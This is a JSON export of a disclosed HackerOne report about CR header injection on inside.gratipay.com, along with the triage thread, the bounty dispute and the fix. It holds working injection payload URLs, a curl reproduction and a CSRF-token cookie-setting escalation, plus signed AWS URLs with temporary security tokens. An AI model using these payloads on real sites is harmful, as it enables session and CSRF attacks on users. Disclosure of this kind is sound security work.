{"id":143139,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDMxMzk=","url":"https://hackerone.com/reports/143139","title":"upgrade Aspen on inside.gratipay.com to pick up CR injection fix","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2016-06-04T23:05:22.989Z","submitted_at":"2016-06-04T23:05:22.989Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"valievkarim","url":"/valievkarim","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/153/860a975b9fdb2c80f4c2f4cfda2388c043d450a0_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1868,"url":"https://hackerone.com/gratipay","handle":"gratipay","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Gratipay","twitter_handle":"Gratipay","website":"https://gratipay.com/","about":"Gratitude? Gratipay! The easiest way for your company to pay for open source."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-03-22T22:31:09.767Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-02-20T22:31:09.605Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"1) Using IE11, open DevTools and start network capture\n2) visit the following URL:\nhttp://inside.gratipay.com/assets/%0dSet-Cookie:%20qwe=qwe%0dq\n\n3) find a 'qwe' cookie set in the response\n\nThere is a 0x0d character injected, which can be used as a header\ndelimiter in IE.\nTo see this behaviour using Curl, you can use the following command:\ncurl -s -v 'http://inside.gratipay.com/assets/%0dSet-Cookie:%20qwe=qwe%0dq' 2\u003e\u00261|less\n\nScreenshots of Curl output and DevTools are attached.\n","vulnerability_information_html":"\u003cp\u003e1) Using IE11, open DevTools and start network capture\u003cbr\u003e\n2) visit the following URL:\u003cbr\u003e\n\u003ca title=\"http://inside.gratipay.com/assets/%0dSet-Cookie:%20qwe=qwe%0dq\" href=\"/redirect?url=http%3A%2F%2Finside.gratipay.com%2Fassets%2F%250dSet-Cookie%3A%2520qwe%3Dqwe%250dq\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://inside.gratipay.com/assets/%0dSet-Cookie:%20qwe=qwe%0dq\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e3) find a \u0026#39;qwe\u0026#39; cookie set in the response\u003c/p\u003e\n\n\u003cp\u003eThere is a 0x0d character injected, which can be used as a header\u003cbr\u003e\ndelimiter in IE.\u003cbr\u003e\nTo see this behaviour using Curl, you can use the following command:\u003cbr\u003e\ncurl -s -v \u0026#39;\u003ca title=\"http://inside.gratipay.com/assets/%0dSet-Cookie:%20qwe=qwe%0dq\" href=\"/redirect?url=http%3A%2F%2Finside.gratipay.com%2Fassets%2F%250dSet-Cookie%3A%2520qwe%3Dqwe%250dq\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://inside.gratipay.com/assets/%0dSet-Cookie:%20qwe=qwe%0dq\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026#39; 2\u0026gt;\u0026amp;1|less\u003c/p\u003e\n\n\u003cp\u003eScreenshots of Curl output and DevTools are attached.\u003c/p\u003e\n","bounty_amount":"40.0","formatted_bounty":"$40","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":97904,"file_name":"img-2016-06-05-01-06-29.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/097/904/fe0fa3889cecdb91d06f3de9d01f09f0ab6d338d/img-2016-06-05-01-06-29.png?response-content-disposition=attachment%3B%20filename%3D%22img-2016-06-05-01-06-29.png%22%3B%20filename%2A%3DUTF-8%27%27img-2016-06-05-01-06-29.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUOQU5REA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042911Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKbajvkbgJ0bk%2BBvRtGQ7p5KCzGha%2FVaDDwyFq8CM66wIgaw7%2FMRI5kyRpH%2BnIlLG4ZnmM%2FrLjLjJWrmkX0zZfd9sqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDP91WL002Wbo0XGfnyqRA%2FNt3W4r54Z2Rrjnbzg30AtIqSAaUbiKh6dYPI5iumJt%2FacDVM4CmdTQCSkrpk45DFotrgtd1tIXQUPsAioE3hz70xop4zS0jebfAPdwBp38Mc3YKPYsW1TgWIT19zK4t%2B4eGJVFjPey5O%2FEfBu4XYpGDd%2Fy2VO0kVCb43%2F76mvlk6aWlA01UhpCilK3J%2F7qqZsw4P3jggaBSCjGhssHvqDLjMzfR%2FDpDE7VaotOr3rJmP5ZK66Q9%2BkoG5kaLgKcslwRO9FGLNBY8AuIhUCEMRp9RM9yBIFYe%2FyyvHRriCVGHEgdIJ9wvxaVVvCfEcWZw1dEIriA6BftAk5kML6b8WN8zwMI3cyqbnvBS9PGbEcrzzU67DDkEk0llxEfFqJB1g4ruY5L2BsxjsulOVXWFSQHoykg7EnBFBbQGmuPAyxW942tXfkTyjH7aQIFAbpwURAHEFFcnVcJBzYS%2B6tGyu1ozPdrsFK5Ko2OryeYDFeK8b9JxwAMZqBekNlk1Bn%2BWq2RJZZBgBTV1X9LfuQ%2FLbSAMJq2qv8FOusBgtnFtNPu6rgydFw%2BpCNudbVGZ39p3P2aIl7K%2B6fRTLBImgaGX5r2pXgGjSRb3Co5NHURzMlQWYw9SJdMt5vMsDNtT9otjm5R%2Fz00sRO779VmfaZOO18lLujlVlImBZA%2BY20iW%2B%2FVBR4UOivJTvxApUCo%2BQYZQghLFkO4s17mPPAo6XeP%2BtXjXhn71RPHuwavkbgQ0EuL1pf5gaqdarsB4psJiZ3FphFomE6unCMAErk3vFIwEIi%2Be5%2FjAIsDg6zS3oetmQEMR7IeJadGwnOF7tifKH8X2cyJk2IoG8HLG%2FfDEf2cBUt6EjPoIQ%3D%3D\u0026X-Amz-Signature=d82bb288f2589c02b710c1e6236deaa6f29dcdc9edd2ba6d0fd1c4e7140b7143","file_size":37643,"type":"image/png"},{"id":97905,"file_name":"img-2016-06-05-01-09-26.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/097/905/dc8e98472699ffde1ded441bcebabde62bed63ce/img-2016-06-05-01-09-26.png?response-content-disposition=attachment%3B%20filename%3D%22img-2016-06-05-01-09-26.png%22%3B%20filename%2A%3DUTF-8%27%27img-2016-06-05-01-09-26.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUOQU5REA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042911Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKbajvkbgJ0bk%2BBvRtGQ7p5KCzGha%2FVaDDwyFq8CM66wIgaw7%2FMRI5kyRpH%2BnIlLG4ZnmM%2FrLjLjJWrmkX0zZfd9sqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDP91WL002Wbo0XGfnyqRA%2FNt3W4r54Z2Rrjnbzg30AtIqSAaUbiKh6dYPI5iumJt%2FacDVM4CmdTQCSkrpk45DFotrgtd1tIXQUPsAioE3hz70xop4zS0jebfAPdwBp38Mc3YKPYsW1TgWIT19zK4t%2B4eGJVFjPey5O%2FEfBu4XYpGDd%2Fy2VO0kVCb43%2F76mvlk6aWlA01UhpCilK3J%2F7qqZsw4P3jggaBSCjGhssHvqDLjMzfR%2FDpDE7VaotOr3rJmP5ZK66Q9%2BkoG5kaLgKcslwRO9FGLNBY8AuIhUCEMRp9RM9yBIFYe%2FyyvHRriCVGHEgdIJ9wvxaVVvCfEcWZw1dEIriA6BftAk5kML6b8WN8zwMI3cyqbnvBS9PGbEcrzzU67DDkEk0llxEfFqJB1g4ruY5L2BsxjsulOVXWFSQHoykg7EnBFBbQGmuPAyxW942tXfkTyjH7aQIFAbpwURAHEFFcnVcJBzYS%2B6tGyu1ozPdrsFK5Ko2OryeYDFeK8b9JxwAMZqBekNlk1Bn%2BWq2RJZZBgBTV1X9LfuQ%2FLbSAMJq2qv8FOusBgtnFtNPu6rgydFw%2BpCNudbVGZ39p3P2aIl7K%2B6fRTLBImgaGX5r2pXgGjSRb3Co5NHURzMlQWYw9SJdMt5vMsDNtT9otjm5R%2Fz00sRO779VmfaZOO18lLujlVlImBZA%2BY20iW%2B%2FVBR4UOivJTvxApUCo%2BQYZQghLFkO4s17mPPAo6XeP%2BtXjXhn71RPHuwavkbgQ0EuL1pf5gaqdarsB4psJiZ3FphFomE6unCMAErk3vFIwEIi%2Be5%2FjAIsDg6zS3oetmQEMR7IeJadGwnOF7tifKH8X2cyJk2IoG8HLG%2FfDEf2cBUt6EjPoIQ%3D%3D\u0026X-Amz-Signature=8f7d18bc20f7cbc8b4c6ffb38f82d6f7a5e1430e87c633bb8f438b4c395645b5","file_size":83153,"type":"image/png"}],"allow_singular_disclosure_at":"2017-03-22T22:31:09.634Z","allow_singular_disclosure_after":-118994281.59785457,"singular_disclosure_allowed":true,"vote_count":8,"voters":["delimitry","0x01alka","eveeez","sumit7","spetr0x","paulch","freelancebank","alxg"],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1000064,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the report, @valievkarim. Will look into it ...","markdown_message":"\u003cp\u003eThanks for the report, \u003ca href=\"/valievkarim\"\u003e@valievkarim\u003c/a\u003e. Will look into it ...\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-05T02:53:11.451Z","updated_at":"2016-06-05T02:53:11.451Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1013294,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We will probably need to fix this in Aspen/Pando rather than in inside.gratipay.com.","markdown_message":"\u003cp\u003eWe will probably need to fix this in Aspen/Pando rather than in inside.gratipay.com.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-14T16:21:00.561Z","updated_at":"2016-06-14T16:21:00.561Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1017319,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We're finalizing our program for Aspen on HackerOne:\n\nhttps://github.com/AspenWeb/salon/issues/3\n\nOnce we're live I'll invite you to refile there.","markdown_message":"\u003cp\u003eWe\u0026#39;re finalizing our program for Aspen on HackerOne:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/AspenWeb/salon/issues/3\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FAspenWeb%2Fsalon%2Fissues%2F3\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/AspenWeb/salon/issues/3\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eOnce we\u0026#39;re live I\u0026#39;ll invite you to refile there.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-16T14:19:40.358Z","updated_at":"2016-06-16T14:19:40.358Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1023028,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-19T04:35:32.260Z","updated_at":"2016-06-19T04:35:32.260Z","actor":{"username":"hammad","cleared":false,"url":"/hammad","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/304/4c0c09c1a7cfe31747e8ac35dd1db26a4efc30ca_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1061665,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi. Any update on this bug? Should I resubmit it in other program?","markdown_message":"\u003cp\u003eHi. Any update on this bug? Should I resubmit it in other program?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-10T16:49:26.430Z","updated_at":"2016-07-10T16:49:26.430Z","actor":{"username":"valievkarim","cleared":false,"url":"/valievkarim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/153/860a975b9fdb2c80f4c2f4cfda2388c043d450a0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1064931,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Haven't heard back from H1 yet about the Aspen program, reached out again:\n\nhttps://github.com/AspenWeb/salon/issues/3#issuecomment-231697943","markdown_message":"\u003cp\u003eHaven\u0026#39;t heard back from H1 yet about the Aspen program, reached out again:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/AspenWeb/salon/issues/3#issuecomment-231697943\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FAspenWeb%2Fsalon%2Fissues%2F3%23issuecomment-231697943\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/AspenWeb/salon/issues/3#issuecomment-231697943\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-12T12:26:22.413Z","updated_at":"2016-07-12T12:26:22.413Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1066177,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"Okay @valievkarim, HackerOne has approved our program for Aspen, and I've invited you to participate. May I ask you to resubmit at https://hackerone.com/aspen? Thanks.","markdown_message":"\u003cp\u003eOkay \u003ca href=\"/valievkarim\"\u003e@valievkarim\u003c/a\u003e, HackerOne has approved our program for Aspen, and I\u0026#39;ve invited you to participate. May I ask you to resubmit at \u003ca title=\"https://hackerone.com/aspen\" href=\"https://hackerone.com/aspen\"\u003ehttps://hackerone.com/aspen\u003c/a\u003e? Thanks.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-13T01:58:27.289Z","updated_at":"2016-07-13T01:58:27.289Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1072699,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi.\nI've resubmitted there (https://hackerone.com/reports/151908) and Changaco from Aspen team says that the bug was alread fixed in Aspen: https://github.com/gratipay/security-qf35us/issues/1\nAnd inside.gratipay.com uses an obsolete version.\n","markdown_message":"\u003cp\u003eHi.\u003cbr\u003e\nI\u0026#39;ve resubmitted there (\u003ca title=\"https://hackerone.com/reports/151908\" href=\"https://hackerone.com/reports/151908\"\u003ehttps://hackerone.com/reports/151908\u003c/a\u003e) and Changaco from Aspen team says that the bug was alread fixed in Aspen: \u003ca title=\"https://github.com/gratipay/security-qf35us/issues/1\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fgratipay%2Fsecurity-qf35us%2Fissues%2F1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/gratipay/security-qf35us/issues/1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nAnd inside.gratipay.com uses an obsolete version.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-17T14:03:34.922Z","updated_at":"2016-07-17T14:03:34.922Z","actor":{"username":"valievkarim","cleared":false,"url":"/valievkarim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/153/860a975b9fdb2c80f4c2f4cfda2388c043d450a0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1073080,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Agreed. Sorry for the trouble. The bug was [fixed](https://github.com/AspenWeb/pando.py/blob/master/Changelog.md#039---released-mon-jun-29-2015-by-whit537) in 0.39 and we are still on 0.37.","markdown_message":"\u003cp\u003eAgreed. Sorry for the trouble. The bug was \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FAspenWeb%2Fpando.py%2Fblob%2Fmaster%2FChangelog.md%23039---released-mon-jun-29-2015-by-whit537\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003efixed\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e in 0.39 and we are still on 0.37.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-18T00:49:55.076Z","updated_at":"2016-07-18T00:49:55.076Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1073081,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"","markdown_message":"","automated_response":false,"created_at":"2016-07-18T00:50:08.376Z","updated_at":"2016-07-18T00:50:08.376Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1073082,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Triaging as a theoretical risk, which carries a $1 bounty per our [program description](https://hackerone.com/gratipay). `inside.gratipay.com` is essentially a static site with no authenticated user functionality. Willing to upgrade the risk class if you can describe a real threat here.","markdown_message":"\u003cp\u003eTriaging as a theoretical risk, which carries a $1 bounty per our \u003ca href=\"https://hackerone.com/gratipay\"\u003eprogram description\u003c/a\u003e. \u003ccode\u003einside.gratipay.com\u003c/code\u003e is essentially a static site with no authenticated user functionality. Willing to upgrade the risk class if you can describe a real threat here.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-18T00:52:06.946Z","updated_at":"2016-07-18T00:52:06.946Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1073083,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2016-07-18T00:52:15.404Z","updated_at":"2016-07-18T00:52:15.404Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1073084,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-07-18T00:52:25.408Z","updated_at":"2016-07-18T00:52:25.408Z","actor":{"url":"/gratipay","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Gratipay"}},"bounty_amount":"1.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"gratipay","collaborator":{"username":"valievkarim","url":"/valievkarim"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1073085,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-07-18T00:53:33.274Z","updated_at":"2016-07-18T00:53:33.274Z","additional_data":{"old_title":"HTTP response header injection at inside.gratipay.com","new_title":"upgrade Aspen on inside.gratipay.com to pick up CR injection fix"},"actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1073086,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Added to the [queue](https://github.com/gratipay/inside.gratipay.com/issues/730#issue-165967823).","markdown_message":"\u003cp\u003eAdded to the \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fgratipay%2Finside.gratipay.com%2Fissues%2F730%23issue-165967823\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003equeue\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-18T00:54:35.154Z","updated_at":"2016-07-18T00:54:35.154Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1073574,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you. But why it's $1, when the same bug was $40 here? https://hackerone.com/reports/79552","markdown_message":"\u003cp\u003eThank you. But why it\u0026#39;s $1, when the same bug was $40 here? \u003ca title=\"https://hackerone.com/reports/79552\" href=\"https://hackerone.com/reports/79552\"\u003ehttps://hackerone.com/reports/79552\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-18T11:50:36.203Z","updated_at":"2016-07-18T11:50:36.203Z","actor":{"username":"valievkarim","cleared":false,"url":"/valievkarim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/153/860a975b9fdb2c80f4c2f4cfda2388c043d450a0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1073874,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Because, as I already mentioned, `inside.gratipay.com` is a static site with no user authentication or actions. On the other hand, `gratipay.com` is our main web app, so header injection and CSRF present a real security threat.","markdown_message":"\u003cp\u003eBecause, as I already mentioned, \u003ccode\u003einside.gratipay.com\u003c/code\u003e is a static site with no user authentication or actions. On the other hand, \u003ccode\u003egratipay.com\u003c/code\u003e is our main web app, so header injection and CSRF present a real security threat.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-18T14:24:20.570Z","updated_at":"2016-07-18T14:24:20.570Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1073927,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Because of how cookies work, inside.gratipay.com can set cookies to gratipay.com. So this header injection can be used to bypass CSRF protection on gratipay.com:\nhttp://inside.gratipay.com/assets/%0dSet-Cookie:%20csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx%3b%20domain=.gratipay.com%0dq:\n\nThe response headers will contain:\n```\nLocation: /assets/\nSet-Cookie: csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; domain=.gratipay.com\nq:/\n```","markdown_message":"\u003cp\u003eBecause of how cookies work, inside.gratipay.com can set cookies to gratipay.com. So this header injection can be used to bypass CSRF protection on gratipay.com:\u003cbr\u003e\n\u003ca title=\"http://inside.gratipay.com/assets/%0dSet-Cookie:%20csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx%3b%20domain=.gratipay.com%0dq:\" href=\"/redirect?url=http%3A%2F%2Finside.gratipay.com%2Fassets%2F%250dSet-Cookie%3A%2520csrf_token%3Dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx%253b%2520domain%3D.gratipay.com%250dq%3A\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://inside.gratipay.com/assets/%0dSet-Cookie:%20csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx%3b%20domain=.gratipay.com%0dq:\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe response headers will contain:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eLocation: /assets/\nSet-Cookie: csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 